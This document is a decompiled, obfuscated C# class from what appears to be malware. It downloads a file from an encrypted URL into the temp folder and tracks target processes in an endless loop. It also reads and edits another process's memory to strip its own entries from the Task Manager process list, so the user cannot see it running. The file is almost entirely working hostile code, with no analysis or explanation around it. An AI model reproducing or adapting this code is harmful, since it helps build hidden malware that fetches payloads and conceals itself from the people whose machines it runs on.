using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

internal sealed class cBQxHfUOBokd
{
	private struct emlQzlwnTtbZS
	{
		public uint NEEVujkTkd;

		public IntPtr rxzCPMjWbPzy;

		public IntPtr ntfobBMniGK;

		public uint rXEnnPjLAZJKX;

		public uint skzHYyRnMfpq;

		public IntPtr NttGTssbJrsZyoe;

		public uint pbgQVgDkqIeb;

		public int hxggkZXHDgk;

		public IntPtr GocZHFNgobaM;
	}

	private static volatile bool vuFkdJhvlfKN;

	public static volatile bool gJMAPWYpFRJPYx;

	[NonSerialized]
	internal static GetString getString_0;

	public static string ZewVVpjGWyIn()
	{
		if (IntPtr.Size == 8)
		{
			efoRmwagKuQD.keGLFzObTnAtzz = FzViFPMAVfqXxg(new Uri(efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399767))));
		}
		else
		{
			efoRmwagKuQD.keGLFzObTnAtzz = FzViFPMAVfqXxg(new Uri(efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399077))));
		}
		return efoRmwagKuQD.keGLFzObTnAtzz;
	}

	public static string FzViFPMAVfqXxg(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107398963), getString_0(107388203)).Remove(0, 3) + getString_0(107398926);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process edSCQAgQGAvrh(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void rPZfOFkDOjltl(string[] string_0)
	{
		string text = ZewVVpjGWyIn();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = edSCQAgQGAvrh(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107398917));
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107398940)));
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107386951)));
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107398883)));
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107398898)));
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107402080)));
					efoRmwagKuQD.FsdXZodtOOOc(text, text2 + getString_0(107385083) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399361)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr KmmilSeaZkhsi);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr ynIrTOGwRFIgG, IntPtr ILlyfYglKY, byte[] llaqJMLenwbSgl, uint vphBltmxowUzkTz, out UIntPtr ZSvMisoYkleBrUUp);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr OGkpBXgFplV, IntPtr SHqCDcOvkivkQQN, [Out] byte[] mtlrHqNBOR, int GqIrSbUgWpnXo, out UIntPtr EKcYsODqOQVQ);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr Iadyhgmbno, out uint CSwkmuAfUswKavkZ);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] tsAFPQLaUFAYyh(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr IRkDGGkpalkB(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void zVCOQZskHIL(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr kHwDFFusAKol(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void uGdrjdLvTJS(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr pSLJhDpsJIORJ()
	{
		IntPtr intPtr = FindWindow(getString_0(107399376), getString_0(107399351));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107399318), getString_0(107399277));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399318), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399292), getString_0(107399239));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399318), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107399292), getString_0(107399258));
	}

	private static IntPtr nusayntgiqZax(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void jTbGhWseMvs(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void vBrJmqMfdJyuvqJG(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string xvEYRlSSEvJadf(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		emlQzlwnTtbZS emlQzlwnTtbZS = default(emlQzlwnTtbZS);
		GetWindowThreadProcessId(intptr_0, out var CSwkmuAfUswKavkZ);
		IntPtr intPtr = IRkDGGkpalkB(CSwkmuAfUswKavkZ);
		IntPtr intPtr2 = kHwDFFusAKol((uint)Marshal.SizeOf(emlQzlwnTtbZS), intPtr);
		IntPtr intPtr3 = kHwDFFusAKol(50u, intPtr);
		emlQzlwnTtbZS.rxzCPMjWbPzy = intptr_1;
		emlQzlwnTtbZS.ntfobBMniGK = (IntPtr)0;
		emlQzlwnTtbZS.pbgQVgDkqIeb = 50u;
		emlQzlwnTtbZS.NttGTssbJrsZyoe = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, tsAFPQLaUFAYyh(emlQzlwnTtbZS), (uint)Marshal.SizeOf(emlQzlwnTtbZS), out var ZSvMisoYkleBrUUp);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out ZSvMisoYkleBrUUp);
		uGdrjdLvTJS(intPtr, intPtr2, (uint)Marshal.SizeOf(emlQzlwnTtbZS));
		uGdrjdLvTJS(intPtr, intPtr3, 50u);
		zVCOQZskHIL(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void aicOWvjigUmPdg(string string_0)
	{
		IntPtr intPtr = pSLJhDpsJIORJ();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)nusayntgiqZax(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = xvEYRlSSEvJadf(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				jTbGhWseMvs(intPtr, (IntPtr)i);
			}
		}
	}

	private static void tJuHNjDywKlLTs()
	{
		IntPtr intPtr = pSLJhDpsJIORJ();
		if (intPtr != IntPtr.Zero)
		{
			vBrJmqMfdJyuvqJG(intPtr);
			vBrJmqMfdJyuvqJG(intPtr);
			vBrJmqMfdJyuvqJG(intPtr);
			vBrJmqMfdJyuvqJG(intPtr);
			vBrJmqMfdJyuvqJG(intPtr);
		}
	}

	public static void odriMQVPspHQ()
	{
		Thread thread = new Thread(zwJeVijDIdRY);
		thread.Start();
	}

	private static void zwJeVijDIdRY()
	{
		while (!vuFkdJhvlfKN)
		{
			if (gJMAPWYpFRJPYx)
			{
				aicOWvjigUmPdg(Process.GetCurrentProcess().ProcessName + getString_0(107398926));
				Thread.Sleep(525);
			}
			else
			{
				tJuHNjDywKlLTs();
				Thread.Sleep(1000);
			}
		}
		vuFkdJhvlfKN = false;
	}

	static cBQxHfUOBokd()
	{
		Strings.CreateGetStringDelegate(typeof(cBQxHfUOBokd));
		vuFkdJhvlfKN = false;
		gJMAPWYpFRJPYx = true;
	}
}
